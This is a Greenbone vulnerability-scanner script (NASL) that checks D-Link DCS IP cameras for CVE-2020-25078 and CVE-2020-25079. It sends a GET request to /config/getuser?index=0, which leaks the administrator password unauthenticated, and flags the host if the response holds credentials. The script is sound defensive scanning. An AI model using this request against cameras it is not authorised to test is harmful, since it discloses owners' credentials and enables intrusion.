# Copyright (C) 2020 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE_PREFIX = "cpe:/o:d-link:dcs";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.144538");
  script_version("2020-09-09T06:54:10+0000");
  script_tag(name:"last_modification", value:"2020-09-09 06:54:10 +0000 (Wed, 09 Sep 2020)");
  script_tag(name:"creation_date", value:"2020-09-09 06:30:14 +0000 (Wed, 09 Sep 2020)");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:C/A:C");

  script_cve_id("CVE-2020-25078", "CVE-2020-25079");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("D-Link DCS IP Cameras Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2020 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_dlink_dcs_http_detect.nasl");
  script_mandatory_keys("Host/is_dlink_dcs_device");

  script_tag(name:"summary", value:"Multiple D-Link DCS IP Cameras are prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  - Unauthenticated administrator password disclosure via /config/getuser (CVE-2020-25078)

  - Authenticated command injection via /cgi-bin/ddns_enc.cgi (CVE-2020-25079)");

  script_tag(name:"affected", value:"D-Link DCS-2530L and DCS-2670L. Other models might be affected as well.");

  script_tag(name:"solution", value:"See the referenced vendor advisory for a solution.");

  script_xref(name:"URL", value:"https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10180");
  script_xref(name:"URL", value:"https://twitter.com/Dogonsecurity/status/1273251236167516161");
  script_xref(name:"URL", value:"https://twitter.com/Dogonsecurity/status/1271265152118259712");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, service: "www"))
  exit(0);

port = infos["port"];
cpe = infos["cpe"];

if (!get_app_location(cpe: cpe, port: port, nofork: TRUE))
  exit(0);

url = "/config/getuser?index=0";

if (http_vuln_check(port: port, url: url, pattern: "pass=", check_header: TRUE, extra_check: "name=")) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
